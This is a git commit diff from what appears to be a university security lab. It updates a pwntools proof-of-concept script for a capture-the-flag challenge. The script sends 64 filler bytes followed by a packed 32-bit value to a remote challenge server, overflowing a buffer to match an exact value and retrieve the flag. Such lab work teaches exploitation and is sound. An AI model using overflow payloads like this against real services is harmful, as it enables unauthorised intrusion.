049638d6b035b1a711aeee8a5a3f0bb0eb4c5228
Tiago Santos <tiago.castro.santos@tecnico.ulisboa.pt>
2025-12-15 15:42:03 +0000

    Updated solution for challenge 2 to use p32

--- lab6/match_an_exact_value_poc.py
+++ lab6/match_an_exact_value_poc.py
@@ -6,7 +6,7 @@ PORT = 25152
 s = remote(SERVER, PORT, timeout=9999)
 
 s.recv(512)
-s.sendline(b'1' * 64 + b'dcba')
+s.sendline(b'1' * 64 + p32(0x61626364))
 time.sleep(1)
 flag = s.recv(512).decode()
 print(flag)
